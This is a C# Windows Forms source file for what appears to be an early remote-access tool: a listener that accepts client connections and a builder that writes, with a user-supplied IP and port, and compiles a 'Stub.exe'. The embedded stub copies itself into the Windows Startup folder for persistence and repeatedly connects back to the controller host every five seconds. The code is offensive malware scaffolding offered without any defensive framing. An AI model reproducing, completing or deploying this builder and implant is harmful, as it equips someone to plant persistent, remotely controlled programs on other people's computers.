using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CE.OG
{
    public partial class Form1 : Form
    {
        private TcpListener tcpListener;
        private Thread listenerThread;
        private List<TcpClient> connectedClients = new List<TcpClient>();
        private object lockObject = new object();
        private TaskCompletionSource<bool> crapBuiltCompletionSource;

        public Form1()
        {
            InitializeComponent();
            crapBuiltCompletionSource = new TaskCompletionSource<bool>();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            // Get the port from the TextBox
            if (int.TryParse(txtListenPort.Text, out int listenPort))
            {
                StartListening(listenPort);
                lblStatus.Text = $"Listening on port {listenPort}...";
            }
            else
            {
                lblStatus.Text = "Invalid port number.";
            }
        }

        private async void button2_Click(object sender, EventArgs e)
        {
            // Get IP and port from TextBoxes
            string crappyIP = txtServerIP.Text;
            int crappyPort;

            if (int.TryParse(txtServerPort.Text, out crappyPort))
            {
                await BuildStubAsync(crappyIP, crappyPort);
                lblStatus.Text = "Stub built and executed successfully.";
            }
            else
            {
                lblStatus.Text = "Invalid port number.";
            }
        }

        private void StartListening(int port)
        {
            tcpListener = new TcpListener(System.Net.IPAddress.Any, port);
            listenerThread = new Thread(new ThreadStart(ListenForClients));
            listenerThread.Start();
        }

        private void ListenForClients()
        {
            tcpListener.Start();
            Console.WriteLine("Server is listening...");

            while (true)
            {
                TcpClient client = tcpListener.AcceptTcpClient();
                Console.WriteLine("Client connected.");

                lock (lockObject)
                {
                    connectedClients.Add(client);
                }

                // Handle client communication in a separate thread
                Thread clientThread = new Thread(() => HandleClient(client));
                clientThread.Start();
            }
        }

        private void HandleClient(TcpClient tcpClient)
        {
            NetworkStream stream = tcpClient.GetStream();

            byte[] buffer = new byte[1024];
            int bytesRead;

            try
            {
                // Receive data from the client
                bytesRead = stream.Read(buffer, 0, buffer.Length);
                string clientData = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                Console.WriteLine($"Received from client: {clientData}");

                // Process the received data (you can implement your monitoring logic here)
                string responseMessage = ProcessClientMessage(clientData);

                // Update the UI with client information
                UpdateClientList(responseMessage);

                // Send a response back to the client
                byte[] responseData = Encoding.ASCII.GetBytes(responseMessage);
                stream.Write(responseData, 0, responseData.Length);
                Console.WriteLine($"Sent to client: {responseMessage}");

                // Open Form2 when a client connects, passing the NetworkStream
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error handling client: {ex.Message}");
            }
            finally
            {
                tcpClient.Close();
            }
        }

        private string ProcessClientMessage(string message)
        {
            // Placeholder implementation, replace with your actual monitoring logic
            return $"Server processed message: {message}";
        }

        private void UpdateClientList(string clientInfo)
        {
            // Update the UI with the client information
            this.Invoke((MethodInvoker)delegate
            {
                listBoxClients.Items.Clear(); // Clear the list before updating

                lock (lockObject)
                {
                    foreach (TcpClient client in connectedClients)
                    {
                        // Assuming you have a way to identify clients uniquely
                        listBoxClients.Items.Add($"Client: {client.Client.RemoteEndPoint} - {clientInfo}");
                    }
                }
            });
        }
        private async Task BuildStubAsync(string crappyIP, int crappyPort)
        {
            await Task.Run(() =>
            {
                try
                {
                    string crapCode = @"
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.IO;
using System.Reflection;
using Microsoft.Win32;
using System.Threading;

class MyCrap
{
    static void Main()
    {
        // Add the crap to crapmap
        MyCrap.AddToCrapmap();

        while (true)
        {
            try
            {
                TcpClient myCrapClient = new TcpClient(" + '"' + crappyIP + '"' + @", " + crappyPort + @");

                using (NetworkStream myStream = myCrapClient.GetStream())
                {
                    byte[] myData = Encoding.ASCII.GetBytes(""Hello, crappy from my crap!"");

                    // Send data to the crappy
                    myStream.Write(myData, 0, myData.Length);

                    // Receive response from the crappy
                    byte[] myBuffer = new byte[1024];
                    int myBytesRead = myStream.Read(myBuffer, 0, myBuffer.Length);
                    string myCrapData = Encoding.ASCII.GetString(myBuffer, 0, myBytesRead);

                    Console.WriteLine(""Received from crappy: "" + myCrapData);
                }

                myCrapClient.Close();
            }
            catch (Exception myEx)
            {
                Console.WriteLine(""Error in my crap: "" + myEx.Message);
            }

            // Optionally add a delay to prevent high CPU usage
            Thread.Sleep(5000); // Sleep for 5 seconds
        }
    }

    static void AddToCrapmap()
    {
        try
        {
            string myCrapExePath = Assembly.GetExecutingAssembly().Location;
            string crapmapFolderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), ""MyCrap.exe"");

            if (!File.Exists(crapmapFolderPath))
            {
                File.Copy(myCrapExePath, crapmapFolderPath, true);
            }
        }
        catch (Exception myEx)
        {
            Console.WriteLine(""Error adding to my crapmap: "" + myEx.Message);
        }
    }
}";


                    // Save crap code to a file
                    string crapFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "MyCrapCode.cs");
                    File.WriteAllText(crapFilePath, crapCode);

                    // Compile the saved crap code
                    CompileStub(crapFilePath).Wait();

                    // Signal that the crap has been built and executed
                    crapBuiltCompletionSource.TrySetResult(true);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error building and running crap: {ex.Message}");
                    // Signal that an error occurred
                    crapBuiltCompletionSource.TrySetException(ex);
                }
            });
        }



        private async Task CompileStub(string filePath)
        {
            await Task.Run(() =>
            {
                CSharpCodeProvider provider = new CSharpCodeProvider();
                CompilerParameters parameters = new CompilerParameters();

                // Reference to System.dll for basic functionality
                parameters.ReferencedAssemblies.Add("System.dll");

                // True - memory generation, false - external file generation
                parameters.GenerateInMemory = false;
                // True - exe file generation, false - dll file generation
                parameters.GenerateExecutable = true;
                // Set the output file name
                parameters.OutputAssembly = "Stub.exe";

                CompilerResults results = provider.CompileAssemblyFromFile(parameters, filePath);

                if (results.Errors.HasErrors)
                {
                    Console.WriteLine("Compilation error:");
                    foreach (CompilerError error in results.Errors)
                    {
                        Console.WriteLine($"{error.ErrorNumber}: {error.ErrorText}");
                    }
                }
                else
                {
                    Console.WriteLine($"Stub compiled successfully. Output file: {parameters.OutputAssembly}");

                    // Run the compiled crap
                    //RunCompiledStub(parameters.OutputAssembly).Wait();
                }
            });
        }

        /*private async Task RunCompiledStub(string executablePath)
        {
            await Task.Run(() =>
           {
                try
                {
                    ProcessStartInfo startInfo = new ProcessStartInfo(executablePath);
                    startInfo.RedirectStandardOutput = true;
                    startInfo.UseShellExecute = false;
                    startInfo.CreateNoWindow = true;

                    using (Process process = new Process())
                    {
                        process.StartInfo = startInfo;
                        process.Start();
                        Thread.Sleep(1000); // Add a short delay (1 second) to allow the process to start
                        process.WaitForExit();

                        Console.WriteLine($"Stub executed successfully.");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error running the compiled crap: {ex.Message}");
                }
            });
        }
        */
        private void txtServerIP_TextChanged(object sender, EventArgs e)
        {

        }

        private void txtServerPort_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
